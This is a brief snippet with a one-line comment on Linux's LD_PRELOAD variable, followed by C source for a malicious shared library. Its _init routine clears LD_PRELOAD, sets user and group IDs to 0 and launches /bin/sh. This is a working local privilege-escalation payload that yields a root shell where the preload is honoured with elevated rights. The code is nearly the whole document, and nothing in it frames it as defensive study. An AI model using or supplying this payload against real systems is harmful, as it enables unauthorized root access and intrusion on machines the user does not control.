# LD_PRELOAD is an environment variable in Linux that allows you to preload a shared library before any other libraries. By using this technique, you can potentially override system functions and gain elevated privileges.

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
